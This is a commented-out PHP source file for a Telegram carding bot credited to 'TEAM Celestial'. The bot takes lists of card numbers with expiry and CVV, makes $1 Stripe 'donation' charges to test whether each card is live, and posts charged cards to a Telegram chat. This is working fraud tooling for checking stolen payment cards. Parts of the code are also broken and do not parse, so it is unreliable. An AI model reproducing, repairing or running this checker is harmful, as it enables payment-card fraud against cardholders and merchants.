// <?php

// if (strpos($text, '!skmass') === 0 or strpos($text, '/skmass') === 0 or strpos($text, '.skmass') === 0) {
//     $messageidtoedit87 = bot('sendmessage', [
//         'chat_id' => $chat_id,
//         'text' => "<b>Wait for Result...</b>",
//         'parse_mode' => 'html',
//         'reply_to_message_id' => $message_id,
//     ]);

//     $messageidtomass = capture(json_encode($messageidtoedit87), '"message_id":', ',');

// $lista = substr($message, 6);
// $lista = clean($lista);
// $separa = explode("|", $lista);
// $cc = $separa[0];
// $mes = $separa[1];
// $ano = $separa[2];
// $cvv = $separa[3];
// // $lista = ("$cc|$mes|$ano|$cvv");

//   $fullmes = '';

// foreach ($cc_list as $cc) {
//     $status = chemker1($cc, $mes, $ano, $cvv);

//     $fullmes .= "
//     CC: <code>$lista</code>
//     Result: <code>$status</code>";
// }


// $umass = "<b>𒀭  MASS CVV CHARGE 1 $  𒀭
//    ━━━━━━━━━━━━━</b>";

// $fmass = "<b>╭───────────────
// 𒆜 PROXY  : [ LIVE & ROTATING ]
// 𒆜 BOT BY : <a href='t.me/crackedaccns'>[ TEAM Celestial ]</a>
// ╰───────────────✘</b>";

// $mallmsg =("$umass $fullmes $fmass");


//     bot('editMessageText', [
//         'chat_id' => $chat_id,
//         'message_id' => $messageidtomass,
//         'text' => $mallmsg,
//         'parse_mode' => 'html',
//         'disable_web_page_preview' => 'true'
//     ]);
// }

//   class Checker {
//       public function check($cc) {
//           global $sk, $chatid;

//           $amt = 1;


//           try {
//               $r = requests_post(
//                   "https://api.stripe.com/v1/payment_methods",
//                   [
//                       "headers" => ["Authorization: Bearer $sk"],
//                       "data" => "type=card&card[number]=.$cc.&card[exp_month]=.$mes.&card[exp_year]=.$ano.&card[cvc]=.$cvv."
//                   ]
//               );
//               $auth1 = $r->text;

//               preg_match('/"id": "(.*)"/', $auth1, $id);
//               if ($id) {
//                   try {
//                       $r2 = requests_post(
//                           "https://api.stripe.com/v1/payment_intents",
//                           [
//                               "headers" => ["Authorization: Bearer $sk"],
//                               "data" => "amount=" . (100 * $amt) . "&currency=usd&payment_method_types[]=card&description=REL8 Donation&payment_method={$id[1]}&confirm=true&off_session=true"
//                           ]
//                       );
//                       $auth2 = $r2->text;

//                       if (strpos($auth2, 'Payment complete') !== false) {
//                           $type = "CCN";
//                           if (strpos($auth2, '"cvc_check": "pass"') !== false) {
//                               $type = "CVV";
//                           }

//                           $premsg = urlencode("<b>CC => <code>$cc</code>\nRESPONSE => $$amt $type CHARGED</b>");
//                           file_get_contents("https://api.telegram.org/$botToken/sendMessage?chat_id=$chatid&text=$premsg&parse_mode=HTML");
//                       } else {strpos($auth2, 'insufficient_funds') !== false){
//                           $type = "Insufficient balance";
//                       }
//                   } catch (Exception $e) {
//                       echo $e->getMessage();
//                   }
//               } else {
//                   // Handle different response cases
//               }
//           } catch (Exception $e) {
//               echo $e->getMessage();
//           }
//       }
//   }

//   function requests_post($url, $data) {
//       $ch = curl_init();
//       curl_setopt($ch, CURLOPT_URL, $url);
//       curl_setopt($ch, CURLOPT_POST, true);
//       curl_setopt($ch, CURLOPT_POSTFIELDS, $data["data"]);
//       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//       curl_setopt($ch, CURLOPT_HTTPHEADER, $data["headers"]);
//       $response = curl_exec($ch);
//       curl_close($ch);
//       return $response;
//   }

//   $threads = [];
//   $thrd = (int) 10;
//   $cclist = readline("[CC PATH] : ");

//   $lista = file($cclist, FILE_IGNORE_NEW_LINES);
//   foreach ($lista as $cc) {
//       $threads[] = (new Checker())->check($cc);
//   }



//     if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))) {
//         $status = "Live 🟡";
//         $response = "Zip Mismatch ❎";
//     } elseif (strpos($result2a, "CVV LIVE")) {
//         $status = "Live 🟢";
//         $response = "CVV Matched ✅";
//     } else {
//         $status = "Dead 🔴";
//         $response = "DEAD = TRY ANOTHER";
//     }

//     return $status;
// }

